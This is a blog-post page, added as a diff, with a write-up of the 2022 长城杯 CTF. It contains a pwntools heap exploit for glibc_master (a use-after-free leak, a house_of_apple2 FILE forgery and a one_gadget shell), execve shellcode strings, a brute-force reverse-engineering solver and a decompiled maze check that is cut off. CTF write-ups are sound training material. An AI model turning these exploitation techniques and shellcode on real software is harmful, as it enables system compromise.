@@ -1,0 +1,1206 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Source Code Pro:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/hacker.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="长城杯," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="glibc_master存在uaf，并且只能分配largebin大小的chunk，主要问题是没给libc，需要结合远程调试，可以通过泄露main_arena的地址，然后通过寻找libc的数据库来确定libc的版本，推荐一个网站：libc-database。有了libc的版本就好处理了，一开始采用的是house_of_cat，但是rcx寄存器为0过不了检查，所以采用house_of_apple2。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022 长城杯">
+<meta property="og:url" content="https://pursuezhou.github.io/2022/08/25/CTF/2022%E9%95%BF%E5%9F%8E%E6%9D%AF/index.html">
+<meta property="og:site_name" content="Pursue">
+<meta property="og:description" content="glibc_master存在uaf，并且只能分配largebin大小的chunk，主要问题是没给libc，需要结合远程调试，可以通过泄露main_arena的地址，然后通过寻找libc的数据库来确定libc的版本，推荐一个网站：libc-database。有了libc的版本就好处理了，一开始采用的是house_of_cat，但是rcx寄存器为0过不了检查，所以采用house_of_apple2。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-08-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-13T12:07:43.978Z">
+<meta property="article:author" content="Pursue">
+<meta property="article:tag" content="长城杯">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://pursuezhou.github.io/2022/08/25/CTF/2022长城杯/"/>
+
+
+
+
+
+  <title>2022 长城杯 | Pursue</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pursue</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Better to light one candle than to curse the darkness.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://pursuezhou.github.io/2022/08/25/CTF/2022%E9%95%BF%E5%9F%8E%E6%9D%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/wechat.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pursue">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2022 长城杯</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-08-25T00:00:00+08:00">
+                2022-08-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="glibc-master"><a href="#glibc-master" class="headerlink" title="glibc_master"></a>glibc_master</h2><p>存在uaf，并且只能分配largebin大小的chunk，主要问题是没给libc，需要结合远程调试，可以通过泄露main_arena的地址，然后通过寻找libc的数据库来确定libc的版本，推荐一个网站：<a target="_blank" rel="noopener" href="https://libc.rip/">libc-database</a>。有了libc的版本就好处理了，一开始采用的是<code>house_of_cat</code>，但是rcx寄存器为0过不了检查，所以采用<code>house_of_apple2</code>。</p>
+<span id="more"></span>
+
+<p>WP如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./glibc_master&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./glibc_master&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;input index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;input size:&#x27;</span>, <span class="built_in">str</span>(size))   <span class="comment"># 0x40e &lt; size &lt;= 0x60f</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;input index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;input context:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):      <span class="comment"># only three times</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;input index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;input index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x518</span>)   <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x418</span>)   <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x508</span>)   <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x418</span>)   <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = uu64() - <span class="number">0x60</span></span><br><span class="line">lg(<span class="string">&#x27;main_arena&#x27;</span>)</span><br><span class="line">libc_base = main_arena - <span class="number">0x1ecb80</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">io_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;io_list_all&#x27;</span>)</span><br><span class="line">io_wfile_jumps = libc_base + <span class="number">0x1e8f60</span></span><br><span class="line">ogg = libc_base + <span class="number">0xe3b01</span></span><br><span class="line">lg(<span class="string">&#x27;ogg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x290</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x508</span>)   <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x5f8</span>)   <span class="comment"># 5</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">pld = p64(libc_base + <span class="number">0x1ed010</span>) * <span class="number">2</span></span><br><span class="line">pld += p64(heap_base + <span class="number">0x290</span>) + p64(io_list_all - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>, pld)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x5f8</span>)   <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x10</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># fp -&gt; _IO_write_base</span></span><br><span class="line">fake_file1 += p64(<span class="number">1</span>)    <span class="comment"># fp -&gt; _IO_write_ptr</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># fp -&gt; _IO_write_end</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0xbd0</span> + <span class="number">0x100</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(io_wfile_jumps)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x100</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_wide = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x68</span></span><br><span class="line">fake_wide += p64(ogg)     <span class="comment"># _wide_vtable + 0x68</span></span><br><span class="line"><span class="comment"># fake_wide = fake_wide.ljust(0xa0, b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment"># fake_wide += p64(heap_base + 0x1c90)    # rsp -&gt; orw_addr</span></span><br><span class="line"><span class="comment"># fake_wide += p64(p_rdi_r + 1)       # rip -&gt; ret</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0xbd0</span> + <span class="number">0x100</span>)     <span class="comment"># _wide_vtable</span></span><br><span class="line"></span><br><span class="line">fake_file1 += fake_wide</span><br><span class="line">edit(<span class="number">4</span>, fake_file1)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">sla(<span class="string">&#x27;input index:&#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="baby-re"><a href="#baby-re" class="headerlink" title="baby_re"></a>baby_re</h2><p>其他文章有详细表述，这里只给出WP：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> new <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;&#x27;</span></span><br><span class="line">ciphertext = <span class="string">&#x27;5WEU5ROREb0hK+AurHXCD80or/h96jqpjEhcoh2CuDh=&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">tm = <span class="built_in">len</span>(ciphertext) / <span class="number">4</span></span><br><span class="line"><span class="comment"># print(tm)</span></span><br><span class="line">lab = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> tm &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">                tmp = flag + i + j + k</span><br><span class="line">                pt = mmo(tmp)</span><br><span class="line">                rs = pt()</span><br><span class="line">                <span class="keyword">if</span> ciphertext.startswith(rs):</span><br><span class="line">                    lab = <span class="number">1</span></span><br><span class="line">                    flag += i + j + k</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> lab == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> lab == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    tm -= <span class="number">1</span></span><br><span class="line">    lab = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> tm == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">                tmp = flag + i + j</span><br><span class="line">                pt = mmo(tmp)</span><br><span class="line">                rs = pt()</span><br><span class="line">                <span class="keyword">if</span> ciphertext.startswith(rs):</span><br><span class="line">                    lab = <span class="number">1</span></span><br><span class="line">                    flag += i + j</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> lab == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> lab == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="rabbit-hole"><a href="#rabbit-hole" class="headerlink" title="rabbit_hole"></a>rabbit_hole</h2><p>一道迷宫题，主要是找到迷宫。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strlen</span>(road) )</span><br><span class="line">  &#123;</span><br><span class="line">    LOWORD(v4) = <span class="number">0</span>;</span><br><span class="line">    LOWORD(v5) = <span class="number">0</span>;</span><br><span class="line">LABEL_21:	<span class="comment">// 找到迷宫的出口</span></span><br><span class="line">    <span class="keyword">if</span> ( (*(<span class="type">unsigned</span> __int8 *)(a1 - <span class="number">29</span>) ^ (<span class="number">16777619</span></span><br><span class="line">                                         * (*(<span class="type">unsigned</span> __int8 *)(a1 - <span class="number">30</span>) ^ (<span class="number">0x1000193</span></span><br><span class="line">                                                                           * (BYTE1(v5) ^ (<span class="number">16777619</span></span><br><span class="line">                                                                                         * ((<span class="type">unsigned</span> __int8)v5 ^ <span class="number">0x50C5D1F</span>))))))) != <span class="number">0x618FF339</span></span><br><span class="line">      &amp;&amp; 